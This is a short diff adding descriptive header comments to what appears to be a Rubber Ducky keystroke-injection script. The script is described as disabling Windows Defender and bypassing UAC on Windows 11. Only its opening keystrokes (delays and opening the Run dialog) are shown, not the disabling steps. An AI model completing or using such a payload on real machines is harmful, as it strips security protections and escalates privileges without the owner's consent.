@@ -1,3 +1,9 @@
+REM Title:         rubberducky-disabling-windows-defender
+REM Description:   disables Windows Defender and bypasses UAC
+REM Author:        eskimek
+REM Category:      Privilege Escalation and Security Bypass
+REM Target:        Windows 11 and maybe windows 10 (didnt test)
+
 DELAY 1000
 WINDOWS r
 DELAY 500
